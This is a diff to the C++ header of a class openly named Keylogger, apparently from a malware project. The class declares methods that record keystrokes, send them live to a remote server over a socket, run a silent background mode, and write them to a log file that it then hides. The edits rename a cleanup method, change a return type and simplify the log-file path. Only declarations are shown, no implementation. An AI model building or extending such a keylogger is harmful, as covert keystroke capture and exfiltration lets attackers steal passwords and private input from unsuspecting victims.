@@ -20,7 +20,7 @@ class Keylogger
         wstring specialKey(INT &keystroke);
         wstring intToUnicode(INT keystroke);
         //-----------------------------------------------
-        VOID directTcp();  //sends live keystrokes to the server.
+        INT directTcp();  //sends live keystrokes to the server.
 
         static DWORD WINAPI sendKeystrokeThread(LPVOID param); // start thread directSendKeystroke
         static DWORD WINAPI recvDataThread(LPVOID param); //start thread directRecvData
@@ -31,7 +31,7 @@ class Keylogger
         static DWORD WINAPI silenciousThread(LPVOID param); //start thread keyboardListeningAndWriteFile
         INT silenciousStart(); //return 1 if error.  | In case of error the silent mod will not work. 
         INT silenciousStop();  //return 1 if error | returns 1 if the silencious thread is not started. 
-        INT silenciousDelete();
+        INT silenciousClean();
         HANDLE silenciousCreateFile(DWORD *ERROR_CODES); //Create a file to store the keystrokes. Then hide the file.  Return NULL if error
         VOID silenciousHideFile();
 
@@ -50,8 +50,7 @@ class Keylogger
     private:
         
         SOCKET a_sock;
-        CONST WCHAR a_log_file[8] = L"log.txt";
-        wstring a_path_log_file;
+        wstring a_path_log_file = L"log.txt";
         HWND a_WindowHandle;
         DWORD a_dwThreadId;
         HKL a_hkl;
